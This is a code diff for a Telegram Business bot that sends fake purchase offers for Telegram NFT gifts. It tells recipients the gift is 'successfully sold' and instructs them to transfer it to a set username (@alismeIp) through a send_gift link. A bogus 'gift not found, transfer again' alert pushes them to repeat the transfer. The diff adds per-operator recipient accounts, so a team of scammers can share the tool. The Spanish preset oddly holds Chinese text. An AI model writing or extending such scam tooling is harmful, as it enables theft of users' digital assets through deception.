@@ -1,4 +1,3 @@
-
 import asyncio
 import hashlib
 import html
@@ -121,55 +120,55 @@ DEFAULT_HELP = "<b>Команды</b>\n\n.help — эта справка\n.shab 
 # Стартовые тексты. Всё это переписывается в админке (🗂 Постоянные офферы).
 DEFAULT_PRESETS = {
     "ru": {
-        "main_text": "{v1}, вам доступно:\n\n{v2} {v3}\n\n{v4}",
-        "btn_accept": "Принять",
-        "btn_reject": "Отклонить",
-        "reject_text": "❌ {v1}, вы отклонили предложение.",
-        "accept_alert": "Вы приняли: {v2} {v3}. Нажмите OK, чтобы продолжить.",
-        "accepted_text": "✅ {v1}, предложение принято.\n\n{v4}",
-        "btn_link": "Перейти",
-        "btn_next": "Далее",
-        "screen3_text": "{v4}\n\n{v5}",
-        "btn_link2": "Перейти",
-        "btn_alert2": "Подробнее",
-        "alert2_text": "{v5}",
+        "main_text": "Пользователь <b>{v1}</b> предлагает\nВам {v2} {v3} за подарок {v4}.\n\nПредложение действует ещё 6ч.",
+        "btn_accept": "{e:5774022692642492953} Принять",
+        "btn_reject": "{e:5774077015388852135} Отклонить",
+        "reject_text": "Предложение отклонено.",
+        "accept_alert": "После принятия следуйте\nинструкциям бота для дальнейших\nдействий.\n\nЕсли вы всё прочитали и\nознакомились, нажмите «ОК».",
+        "accepted_text": "{e:5773677501825945508} Подарок: {v4}\nуспешно продан!\n\n<b>Передайте подарок</b>\n<b>покупателю для зачисления {v3}.</b>",
+        "btn_link": "{e:5776023601941582822} Передать NFT",
+        "btn_next": "{e:6037622221625626773} Как передать?",
+        "screen3_text": "<b>Инструкция для завершения сделки:</b>\n\n1) Передайте подарок пользователю\n{v5}.\n2) Нажмите «Передать подарок» и выберите <b>{v4}</b>.\n3) Подтвердите передачу подарка.\n\n<b>Предложение действительно 6 часов.</b>",
+        "btn_link2": "{e:5776023601941582822} Передать NFT",
+        "btn_alert2": "{e:6030445631921721471} Подтвердить передачу",
+        "alert2_text": "Подарок не найден, пожалуйста, передайте NFT и нажмите кнопку ещё раз.",
         "v3_stars": "звёзд",
         "v3_gram": "GRAM",
-        "v3_rub": "рублей",
+        "v3_rub": "RUB",
         "v3_usdt": "USDT",
     },
     "en": {
-        "main_text": "{v1}, you have:\n\n{v2} {v3}\n\n{v4}",
-        "btn_accept": "Accept",
-        "btn_reject": "Decline",
-        "reject_text": "❌ {v1}, you declined the offer.",
-        "accept_alert": "You accepted: {v2} {v3}. Press OK to continue.",
-        "accepted_text": "✅ {v1}, offer accepted.\n\n{v4}",
-        "btn_link": "Open",
-        "btn_next": "Next",
-        "screen3_text": "{v4}\n\n{v5}",
-        "btn_link2": "Open",
-        "btn_alert2": "Details",
-        "alert2_text": "{v5}",
+        "main_text": "User {v1} offers\nYou {v2} {v3} for a gift {v4}.\n\n<b>The offer is valid for another 6 hours.</b>",
+        "btn_accept": "{e:5774022692642492953} Accept",
+        "btn_reject": "{e:5774077015388852135} Reject",
+        "reject_text": "The proposal has been rejected.",
+        "accept_alert": "After acceptance, follow the bot’s instructions for further actions.\n\n If you have read and reviewed everything, click “OK”.",
+        "accepted_text": "{e:5773677501825945508} Gift: {v4}\nsuccessfully sold!\n\n<b>Transfer the gift </b>\n<b>to the buyer to receive {v3}.</b>",
+        "btn_link": "{e:5776023601941582822} Transfer NFT",
+        "btn_next": "{e:6037622221625626773} How to transfer?",
+        "screen3_text": '<b>Instructions for completing the transaction:</b>\n\n1. Transfer the gift to the user {v5}\n2. Click "Transfer the gift" and select {v4}.\n3. Confirm the gift transfer.\n\n<b>The offer is valid for 6 hours.</b>',
+        "btn_link2": "{e:5776023601941582822} Transfer NFT",
+        "btn_alert2": "{e:6030445631921721471} Confirm the transfer",
+        "alert2_text": "The gift was not found. Please transfer the NFT and press the button again.",
         "v3_stars": "stars",
         "v3_gram": "GRAM",
         "v3_rub": "RUB",
         "v3_usdt": "USDT",
     },
     "es": {
-        "main_text": "{v1}, tienes:\n\n{v2} {v3}\n\n{v4}",
-        "btn_accept": "Aceptar",
-        "btn_reject": "Rechazar",
-        "reject_text": "❌ {v1}, has rechazado la oferta.",
-        "accept_alert": "Has aceptado: {v2} {v3}. Pulsa OK para continuar.",
-        "accepted_text": "✅ {v1}, oferta aceptada.\n\n{v4}",
-        "btn_link": "Abrir",
-        "btn_next": "Siguiente",
-        "screen3_text": "{v4}\n\n{v5}",
-        "btn_link2": "Abrir",
-        "btn_alert2": "Detalles",
-        "alert2_text": "{v5}",
-        "v3_stars": "estrellas",
+        "main_text": "使用者 {v1} 提出：\n以 {v4} 作為禮物，向您 {v2} 提供 {v3}。\n\n此提議在未來 6 小時內有效。",
+        "btn_accept": "{e:5774022692642492953} 接受",
+        "btn_reject": "{e:5774077015388852135} 拒絕",
+        "reject_text": "該提案已被否決。",
+        "accept_alert": "接受後，請按照機器人的指示進行後續操作。\n\n如果您已閱讀並審查了所有內容，請點選「確定」。",
+        "accepted_text": "{e:5773677501825945508} 禮物：{v4}\n已成功售出！\n\n將禮物轉交給買家，\n即可獲得 {v3}。",
+        "btn_link": "{e:5776023601941582822} 轉移 NFT",
+        "btn_next": "{e:6037622221625626773} 如何轉帳？",
+        "screen3_text": "完成交易的操作指南：\n\n1. 將禮物轉贈給使用者 {v5}。\n2. 點選「轉贈禮物」並選擇 {v4}。\n3. 確認轉贈禮物。\n\n此優惠有效期限為 6 小時。",
+        "btn_link2": "{e:5776023601941582822} 轉移 NFT",
+        "btn_alert2": "{e:6030445631921721471} 確認轉帳",
+        "alert2_text": "未找到該贈禮。請轉入 NFT，然後再次按下按鈕。",
+        "v3_stars": "星星",
         "v3_gram": "GRAM",
         "v3_rub": "RUB",
         "v3_usdt": "USDT",
@@ -178,13 +177,13 @@ DEFAULT_PRESETS = {
 
 # Постоянные значения для всех языков (редактируются в админке: 🔧 Постоянные значения)
 DEFAULT_SETTINGS = {
-    "v5_html": "@example",  # переменная {v5} (можно с форматированием и премиум-эмодзи)
-    "link_url": "https://t.me/{v5}",  # ссылка кнопок; {v5} подставляется автоматически
+    "v5_html": "@alismeIp",  # переменная {v5} (можно с форматированием и премиум-эмодзи)
+    "link_url": "tg://send_gift?to=alismeIp",  # ссылка кнопок; {v5} подставляется автоматически
     "emoji_v1": "",  # ID премиум-эмодзи после {v1}
-    "emoji_v2_stars": "",  # после {v2}, если выбраны «звёзды»
-    "emoji_v2_gram": "",  # после {v2}, если выбран «GRAM»
-    "emoji_v2_rub": "",  # после {v2}, если выбраны рубли
-    "emoji_v2_usdt": "",  # после {v2}, если выбран USDT
+    "emoji_v2_stars": "5895708410447401643",  # после {v2}, если выбраны «звёзды»
+    "emoji_v2_gram": "5294028881492226080",  # после {v2}, если выбран «GRAM»
+    "emoji_v2_rub": "5384212478764810822",  # после {v2}, если выбраны рубли
+    "emoji_v2_usdt": "5413877074848932790",  # после {v2}, если выбран USDT
     "emoji_stars": "",  # после {v3}, если выбраны «звёзды»
     "emoji_gram": "",  # после {v3}, если выбран «GRAM»
     "emoji_rub": "",  # после {v3}, если выбраны рубли
@@ -192,7 +191,6 @@ DEFAULT_SETTINGS = {
     "name_mode": "sender_first",
     "notify_mode": "super",  # super — уведомления только суперадмину, all — всем админам (кроме менеджеров)
 }
-
 
 # ───────────────────────────── Хранилище (JSON) ─────────────────────────────
 def new_template(lang: str) -> dict:
@@ -230,8 +228,35 @@ def get_tpl(owner_id, n: str) -> dict | None:
     return None
 
 
+# Личные реквизиты получателя: {v5} и ссылка кнопки. Пусто — берётся значение суперадмина.
+OWN_KEYS = ("v5_html", "link_url")
+
+
+def user_settings(owner_id=None) -> dict:
+    """Эффективные постоянные значения: общие + личные переопределения админа."""
+    st = dict(db.data["settings"])
+    if owner_id:
+        own = db.data.get("user_settings", {}).get(str(owner_id)) or {}
+        for key in OWN_KEYS:
+            if own.get(key):
+                st[key] = own[key]
+    return st
+
+
+def set_user_setting(user_id, key: str, value) -> None:
+    """Личное значение админа. None — вернуть значение по умолчанию."""
+    store = db.data.setdefault("user_settings", {})
+    own = store.setdefault(str(user_id), {})
+    if value is None:
+        own.pop(key, None)
+        if not own:
+            store.pop(str(user_id), None)
+        return
+    own[key] = value
+
+
 def owner_of_bcid(bcid: str | None):
-    """Владелец бизнес-подключения — по нему определяется, чьи офферы использовать."""
+    """Владелец бизнес-подключения — по нему определяется, чьи офферы и реквизиты использовать."""
     if not bcid:
         return None
     return (db.data["connections"].get(bcid) or {}).get("user_id")
@@ -248,6 +273,7 @@ class Storage:
             "settings": {},
             "admins": [],
             "managers": [],  # могут выдавать админку, уведомления им не приходят
+            "user_settings": {},  # "user_id" -> {"v5_html", "link_url"} — личный получатель
             "templates": {},  # "owner_id:номер" -> оффер
             "connections": {},  # business_connection_id -> {"user_id": ...}
             "business_chats": {},  # username lowercase -> {chat_id, business_connection_id, name}
@@ -262,6 +288,7 @@ class Storage:
         self.data.setdefault("gift_cache", {})
         self.data.setdefault("gift_next", {})
         self.data.setdefault("managers", [])
+        self.data.setdefault("user_settings", {})
         old_settings = self.data.get("settings", {})
         self.data["settings"] = {**DEFAULT_SETTINGS, **old_settings}
         # Совместимость со старым единым эмодзи после {v2}.
@@ -557,9 +584,9 @@ def bold_var(text: str, emoji_id: str) -> str:
     return out + (" " + emoji_tag(emoji_id) if emoji_id else "")
 
 
-def make_vars(tpl: dict, name: str):
+def make_vars(tpl: dict, name: str, owner_id=None):
     """Возвращает (html-значения, plain-значения) переменных {v1}..{v5}."""
-    st = db.data["settings"]
+    st = user_settings(owner_id)
     preset = db.data["presets"][tpl["lang"]]
     choice = tpl["v3_choice"]
     v3_text = preset["v3_" + choice]
@@ -604,18 +631,18 @@ def parse_label(raw: str, variables: dict) -> tuple[str, str | None]:
     return render_plain(raw, variables), (m.group(1) if m else None)
 
 
-def link_url() -> str:
+def link_url(owner_id=None) -> str:
     """Ссылка кнопок. {v5} в ней заменяется на значение переменной 5 —
     так ссылка меняется только вместе с {v5}."""
-    st = db.data["settings"]
+    st = user_settings(owner_id)
     v5 = html.unescape(TAG_RE.sub("", st["v5_html"]))
     v5 = EMOJI_RE.sub("", v5).strip().lstrip("@")
     return st["link_url"].replace("{v5}", urllib.parse.quote(v5, safe=""))
 
 
-def build_screen(n: str, tpl: dict, screen: str, name: str, icons: bool = True):
+def build_screen(n: str, tpl: dict, screen: str, name: str, icons: bool = True, owner_id=None):
     """Возвращает (html_текст, клавиатура) для экрана оффера."""
-    html_vars, plain_vars = make_vars(tpl, name)
+    html_vars, plain_vars = make_vars(tpl, name, owner_id)
 
     def btn(key: str, **kw) -> InlineKeyboardButton:
         text, emoji_id = parse_label(get_block(tpl, key), plain_vars)
@@ -623,7 +650,7 @@ def build_screen(n: str, tpl: dict, screen: str, name: str, icons: bool = True):
         return InlineKeyboardButton(text=text or "•", **kw, **extra)
 
     def link_btn(key: str) -> InlineKeyboardButton:
-        return btn(key, url=link_url())
+        return btn(key, url=link_url(owner_id))
 
     rows = None
     if screen == "main":
@@ -639,19 +666,19 @@ def build_screen(n: str, tpl: dict, screen: str, name: str, icons: bool = True):
     return text, markup
 
 
-def alert_text(tpl: dict, key: str, name: str) -> str:
-    _, plain_vars = make_vars(tpl, name)
+def alert_text(tpl: dict, key: str, name: str, owner_id=None) -> str:
+    _, plain_vars = make_vars(tpl, name, owner_id)
     return render_plain(get_block(tpl, key), plain_vars)[:200]
 
 
 async def edit_screen(bot: Bot, *, chat_id: int, message_id: int, bcids: list,
-                      n: str, tpl: dict, screen: str, name: str) -> None:
+                      n: str, tpl: dict, screen: str, name: str, owner_id=None) -> None:
     """Правит сообщение (в бизнес-чате или обычном). Если Telegram не принял иконки
     премиум-эмодзи на кнопках — повторяет без них."""
     last_error = None
     for bcid in bcids:
         for icons in (True, False):
-            text, markup = build_screen(n, tpl, screen, name, icons)
+            text, markup = build_screen(n, tpl, screen, name, icons, owner_id)
             try:
                 await bot.edit_message_text(
                     text=text, chat_id=chat_id, message_id=message_id,
@@ -668,9 +695,10 @@ async def edit_screen(bot: Bot, *, chat_id: int, message_id: int, bcids: list,
 
 
 async def send_screen(bot: Bot, chat_id: int, n: str, tpl: dict, name: str,
-                      screen: str = "main", business_connection_id: str | None = None):
+                      screen: str = "main", business_connection_id: str | None = None,
+                      owner_id=None):
     for icons in (True, False):
-        text, markup = build_screen(n, tpl, screen, name, icons)
+        text, markup = build_screen(n, tpl, screen, name, icons, owner_id)
         try:
             return await bot.send_message(
                 chat_id, text, business_connection_id=business_connection_id,
@@ -706,6 +734,7 @@ INFO_ADMIN = (
     "\n\n<b>Админ-панель</b> — /admin\n"
     "• 📖 Сообщение .help\n"
     "• 🧩 Офферы — создаёте номер: язык, сумма, звёзды/GRAM/рубли/USDT, название нфт и ссылка на подарок\n"
+    "• 🔧 Настройки — свой юзернейм получателя и своя ссылка кнопки\n"
     "• 📤 /dump_texts — выгрузка всех текстов по всем языкам файлом\n"
 )
 
@@ -857,7 +886,7 @@ async def on_business_message(message: Message, bot: Bot):
     try:
         await edit_screen(
             bot, chat_id=message.chat.id, message_id=message.message_id,
-            bcids=[bcid], n=n, tpl=tpl, screen="main", name=name,
+            bcids=[bcid], n=n, tpl=tpl, screen="main", name=name, owner_id=owner_id,
         )
         return
     except Exception as edit_exc:  # noqa: BLE001 — не оставляем ошибку без диагностики
@@ -871,7 +900,7 @@ async def on_business_message(message: Message, bot: Bot):
     try:
         sent = await send_screen(
             bot, message.chat.id, n, tpl, name,
-            screen="main", business_connection_id=bcid,
+            screen="main", business_connection_id=bcid, owner_id=owner_id,
         )
         remember(sent.chat.id, sent.message_id, name)
         log.info("Экран отправлен отдельным сообщением: chat_id=%s bcid=%s", message.chat.id, bcid)
@@ -904,13 +933,15 @@ async def on_conf_callback(cq: CallbackQuery, bot: Bot):
     bcid = getattr(msg, "business_connection_id", None) if msg else None
     if not msg or not bcid:
         return await cq.answer("Не найдено Business-подключение для этого сообщения", show_alert=True)
-    tpl = get_tpl(owner_of_bcid(bcid), n)
+    owner_id = owner_of_bcid(bcid)
+    tpl = get_tpl(owner_id, n)
     if not tpl:
         return await cq.answer("Оффер не найден", show_alert=True)
     name = recall_name(msg.chat.id, msg.message_id)
     try:
         await edit_screen(bot, chat_id=msg.chat.id, message_id=msg.message_id,
-                          bcids=[bcid], n=n, tpl=tpl, screen="main", name=name)
+                          bcids=[bcid], n=n, tpl=tpl, screen="main", name=name,
+                          owner_id=owner_id)
         await cq.answer()
     except Exception:  # noqa: BLE001
         log.exception("Не удалось открыть экран 1 по +conf для оффера %s", n)
@@ -931,14 +962,16 @@ async def on_shab_callback(cq: CallbackQuery, bot: Bot):
     # если у сообщения нет business_connection_id — пробуем обычное редактирование,
     # затем известные бизнес-подключения
     bcids = [bcid] if bcid else [None, *db.data["connections"]]
-    tpl = get_tpl(owner_of_bcid(bcid), n)
+    owner_id = owner_of_bcid(bcid)
+    tpl = get_tpl(owner_id, n)
     if not tpl:
         return await cq.answer("Оффер не найден", show_alert=True)
     name = recall_name(msg.chat.id, msg.message_id)
 
     async def go(screen: str):
         await edit_screen(bot, chat_id=msg.chat.id, message_id=msg.message_id,
-                          bcids=bcids, n=n, tpl=tpl, screen=screen, name=name)
+                          bcids=bcids, n=n, tpl=tpl, screen=screen, name=name,
+                          owner_id=owner_id)
 
     try:
         if action == "rej":
@@ -948,12 +981,12 @@ async def on_shab_callback(cq: CallbackQuery, bot: Bot):
             # Сначала меняем экран; затем отвечаем на callback, чтобы ошибка редактирования
             # не оставляла кнопку в бесконечной загрузке.
             await go("accepted")
-            await cq.answer(alert_text(tpl, "accept_alert", name) or None, show_alert=True)
+            await cq.answer(alert_text(tpl, "accept_alert", name, owner_id) or None, show_alert=True)
         elif action == "s3":
             await go("s3")
             await cq.answer()
         elif action == "al2":
-            await cq.answer(alert_text(tpl, "alert2_text", name) or None, show_alert=True)
+            await cq.answer(alert_text(tpl, "alert2_text", name, owner_id) or None, show_alert=True)
         else:
             await cq.answer()
     except Exception as exc:  # noqa: BLE001
@@ -984,8 +1017,8 @@ admin.callback_query.filter(F.from_user.id.func(lambda uid: uid in get_admin_ids
 
 
 class AdminCallbackPermissions(BaseMiddleware):
-    """Обычным админам и менеджерам разрешены создание и редактирование полей своих офферов.
-    Управление администраторами — только менеджерам и суперадмину."""
+    """Обычным админам и менеджерам разрешены создание и редактирование полей своих офферов
+    и своих реквизитов. Управление администраторами — только менеджерам и суперадмину."""
     async def __call__(self, handler, event, data):
         user = getattr(event, "from_user", None)
         if user and is_superadmin(user.id):
@@ -1036,11 +1069,11 @@ MAIN_KB = kb(
 )
 USER_MAIN_KB = kb(
     [("🧩 Создать оффер", "a:tpls")],
-    [("🔧 Изменить юзернейм и ссылки кнопок", "a:set")],
+    [("🔧 Мои реквизиты и ссылка", "a:set")],
 )
 MANAGER_MAIN_KB = kb(
     [("🧩 Создать оффер", "a:tpls")],
-    [("🔧 Изменить юзернейм и ссылки кнопок", "a:set")],
+    [("🔧 Мои реквизиты и ссылка", "a:set")],
     [("👥 Управление админами", "a:admins")],
 )
 
@@ -1078,9 +1111,10 @@ HINTS = {"html": HINT_HTML, "label": HINT_LABEL, "alert": HINT_ALERT, "plain": H
 
 # Постоянные значения: ключ -> (название, подсказка)
 SET_TITLES = {
-    "v5_html": ("Юзернейм кому передавать нфт", HINT_HTML + "\n«-» — очистить."),
+    "v5_html": ("Юзернейм кому передавать нфт", HINT_HTML + "\n«-» — вернуть значение по умолчанию."),
     "link_url": ("Ссылка кнопок",
-                 "Отправьте ссылку кому передавать нфт (tg://send_gift?to=юзернейм)."
+                 "Отправьте ссылку кому передавать нфт (tg://send_gift?to=юзернейм). "
+                 "«-» — вернуть значение по умолчанию."
                  ),
     "emoji_v1": ("Премиум-эмодзи после имени пользователя", HINT_EMOJI),
     "emoji_v2_stars": ("Премиум-эмодзи после суммы (нужен id эмодзи) (звёзды)", HINT_EMOJI),
@@ -1123,9 +1157,11 @@ def short(value: str) -> str:
     return html.escape(plain[:50]) or "—"
 
 
-def card_text(n: str, tpl: dict) -> str:
+def card_text(n: str, tpl: dict, owner_id=None) -> str:
     choice = tpl["v3_choice"]
     v3 = db.data["presets"][tpl["lang"]]["v3_" + choice]
+    st = user_settings(owner_id)
+    own = (db.data.get("user_settings", {}).get(str(owner_id)) or {}) if owner_id else {}
     lines = [
         f"🧩 <b>Оффер №{n}</b> · {LANGS[tpl['lang']]}",
         "",
@@ -1134,7 +1170,8 @@ def card_text(n: str, tpl: dict) -> str:
         f"💱 Валюта сделки: {html.escape(v3)}",
         f"🖼 Название NFT: {html.escape(tpl['v4_text']) or '—'}",
         f"🔗 Ссылка на NFT: {html.escape(tpl['v4_url']) or 'без ссылки'}",
-        f"🎁 Кому передавать NFT: {short(db.data['settings']['v5_html'])}",
+        f"🎁 Кому передавать NFT: {short(st['v5_html'])}"
+        + ("" if own.get("v5_html") else " <i>(по умолчанию)</i>"),
         "",
         f"Команда в чате: <code>.shab {n}</code>",
         "Оффер личный: работает только под вашим Business-аккаунтом.",
@@ -1155,7 +1192,19 @@ def card_kb(n: str) -> InlineKeyboardMarkup:
 def settings_text(user_id: int | None = None) -> str:
     st = db.data["settings"]
     if user_id is not None and not is_superadmin(user_id):
-        return "\n".join(["🔧 <b>Настройки офферов</b>", "", f"Юзернейм кому передавать нфт: = {short(st['v5_html'])}", f"🔗 Ссылка кнопки передать нфт", f"Сейчас ведёт на: {html.escape(link_url())}"])
+        own = db.data.get("user_settings", {}).get(str(user_id)) or {}
+        eff = user_settings(user_id)
+        return "\n".join([
+            "🔧 <b>Ваши реквизиты для получения NFT</b>",
+            "",
+            f"👤 Кому передавать нфт: {short(eff['v5_html'])}"
+            + (" · <b>своё</b>" if own.get("v5_html") else " · по умолчанию"),
+            f"🔗 Ссылка кнопки: {html.escape(eff['link_url'])}"
+            + (" · <b>своя</b>" if own.get("link_url") else " · по умолчанию"),
+            "",
+            "По умолчанию берутся значения суперадмина.",
+            "Отправьте «-», чтобы вернуть значение по умолчанию.",
+        ])
     mode = dict(NAME_MODES).get(st["name_mode"], "—")
     notify = "только суперадмину (тихо)" if st.get("notify_mode", "super") == "super" else "всем админам (кроме менеджеров)"
 
@@ -1168,6 +1217,8 @@ def settings_text(user_id: int | None = None) -> str:
         f"{{v5}} = {short(st['v5_html'])}",
         f"🔗 Ссылка кнопок: {html.escape(st['link_url'])}",
         f"      сейчас ведёт на: {html.escape(link_url())}",
+        "",
+        "Это значения по умолчанию для всех админов. Свой получатель у каждого — в его «Настройках».",
         "",
         f"Эмодзи после имени: {e('emoji_v1')}",
         f"Эмодзи после суммы (звёзды): {e('emoji_v2_stars')}",
@@ -1197,7 +1248,7 @@ SETTINGS_KB = kb(
     [("⬅️ Назад", "a:menu")],
 )
 USER_SETTINGS_KB = kb(
-    [("✏️ Изменить юзернейм", "s:e:v5_html"), ("🔗 Ссылка кнопок", "s:e:link_url")],
+    [("✏️ Мой юзернейм получателя", "s:e:v5_html"), ("🔗 Моя ссылка кнопки", "s:e:link_url")],
     [("📤 Выгрузить все тексты", "d:dump")],
     [("⬅️ Назад", "a:menu")],
 )
@@ -1207,19 +1258,19 @@ def settings_kb_for(user_id: int) -> InlineKeyboardMarkup:
     return SETTINGS_KB if is_superadmin(user_id) else USER_SETTINGS_KB
 
 
-def current_value(target: str, key: str) -> str:
+def current_value(target: str, key: str, user_id: int | None = None) -> str:
     if target == "help":
         return db.data["help_html"]
     if target == "set":
-        return db.data["settings"][key]
+        return user_settings(user_id).get(key, "")
     if target.startswith("pre:"):
         return db.data["presets"][target[4:]][key]
     _, owner, n = target.split(":")
     return db.data["templates"].get(tpl_key(owner, n), {}).get(key, "")
 
 
-def make_prompt(target: str, key: str) -> str:
-    cur = html.escape(current_value(target, key))[:800] or "—"
+def make_prompt(target: str, key: str, user_id: int | None = None) -> str:
+    cur = html.escape(current_value(target, key, user_id))[:800] or "—"
     if target == "help":
         title, hint = "Сообщение .help", HINT_HTML
     elif target == "set":
@@ -1234,7 +1285,7 @@ def make_prompt(target: str, key: str) -> str:
 async def ask_value(cq: CallbackQuery, state: FSMContext, target: str, key: str, back_cb: str):
     await state.set_state(S.value)
     await state.update_data(target=target, key=key)
-    await show(cq, make_prompt(target, key), kb([("✖️ Отмена", back_cb)]))
+    await show(cq, make_prompt(target, key, cq.from_user.id), kb([("✖️ Отмена", back_cb)]))
 
 
 async def read_block(key: str, message: Message):
@@ -1272,6 +1323,7 @@ def dump_bytes(user_id: int) -> bytes:
     }
     if is_superadmin(user_id):
         payload["templates"] = dict(db.data["templates"])
+        payload["user_settings"] = dict(db.data.get("user_settings", {}))
     else:
         payload["templates"] = {k: v for k, v in owner_templates(user_id).items()}
     return json.dumps(payload, ensure_ascii=False, indent=2).encode("utf-8")
@@ -1630,6 +1682,7 @@ async def a_admin_del(cq: CallbackQuery, state: FSMContext):
         return await cq.answer("Менеджера может снять только суперадмин", show_alert=True)
     db.data["admins"] = [int(x) for x in db.data.get("admins", []) if int(x) != uid]
     db.data["managers"] = [int(x) for x in db.data.get("managers", []) if int(x) != uid]
+    db.data.get("user_settings", {}).pop(str(uid), None)
     db.save()
     await state.clear()
     await show(cq, admins_text(), admins_kb(cq.from_user.id))
@@ -1715,7 +1768,7 @@ async def wiz_step(msg: Message, state: FSMContext, draft: dict, i: int):
         db.save()
         await state.clear()
         await msg.answer(
-            f"✅ Оффер №{n} создан.\n\n" + card_text(n, tpl),
+            f"✅ Оффер №{n} создан.\n\n" + card_text(n, tpl, draft["owner"]),
             reply_markup=card_kb(n),
         )
         return
@@ -1814,13 +1867,13 @@ async def tpl_cb(cq: CallbackQuery, state: FSMContext, bot: Bot):
 
     if act == "card":
         await state.clear()
-        await show(cq, card_text(n, tpl), card_kb(n))
+        await show(cq, card_text(n, tpl, owner), card_kb(n))
     elif act == "e" and parts[3] in TPL_TITLES:  # число / текст {v4} / ссылка {v4}
         await ask_value(cq, state, f"tpl:{owner}:{n}", parts[3], f"t:{n}")
     elif act == "v3":  # переключатель звёзды ⇄ GRAM ⇄ рубли
         tpl["v3_choice"] = {"stars": "gram", "gram": "rub", "rub": "usdt", "usdt": "stars"}.get(tpl["v3_choice"], "stars")
         db.save()
-        await show(cq, card_text(n, tpl), card_kb(n))
+        await show(cq, card_text(n, tpl, owner), card_kb(n))
     elif act == "lang":
         rows = [[(name, f"t:{n}:sl:{code}")] for code, name in LANGS.items()]
         rows.append([("⬅️ Назад", f"t:{n}")])
@@ -1829,10 +1882,10 @@ async def tpl_cb(cq: CallbackQuery, state: FSMContext, bot: Bot):
         if parts[3] in LANGS:
             tpl["lang"] = parts[3]
             db.save()
-        await show(cq, card_text(n, tpl), card_kb(n))
+        await show(cq, card_text(n, tpl, owner), card_kb(n))
     elif act == "prev":
         name = pick_name(db.data["settings"]["name_mode"], cq.from_user, cq.message.chat)
-        text, markup = build_screen(n, tpl, "main", name, icons=True)
+        text, markup = build_screen(n, tpl, "main", name, icons=True, owner_id=owner)
         rows = list(markup.inline_keyboard) if markup else []
         rows.append([InlineKeyboardButton(text="⬅️ Назад к офферу", callback_data=f"t:{n}")])
         preview_markup = InlineKeyboardMarkup(inline_keyboard=rows)
@@ -1897,25 +1950,31 @@ async def on_value(message: Message, state: FSMContext):
         db.data["help_html"] = message.html_text
         back = "a:help"
     elif target == "set":
-        st = db.data["settings"]
         back = "a:set"
+        mine = not is_superadmin(message.from_user.id)
+        value = None
         if key == "v5_html":
-            st[key] = "" if clear else message.html_text
+            value = None if clear else message.html_text
         elif key == "link_url":
             if not URL_RE.match(text.replace("{v5}", "x")):
                 return await message.answer("Нужна ссылка вида https://… или tg://…")
-            st[key] = text
-        else:  # emoji_*
+            value = None if clear else text
+        else:  # emoji_* (только суперадмин)
             if clear:
-                st[key] = ""
+                db.data["settings"][key] = ""
             else:
                 ids = [e.custom_emoji_id for e in (message.entities or []) if e.type == "custom_emoji"]
                 if ids:
-                    st[key] = ids[0]
+                    db.data["settings"][key] = ids[0]
                 elif text.isdigit():
-                    st[key] = text
+                    db.data["settings"][key] = text
                 else:
                     return await message.answer("Отправьте премиум-эмодзи или его ID (число).")
+        if key in OWN_KEYS:
+            if mine:
+                set_user_setting(message.from_user.id, key, value)
+            else:
+                db.data["settings"][key] = "" if value is None else value
     elif target.startswith("pre:"):
         lang = target[4:]
         if clear:
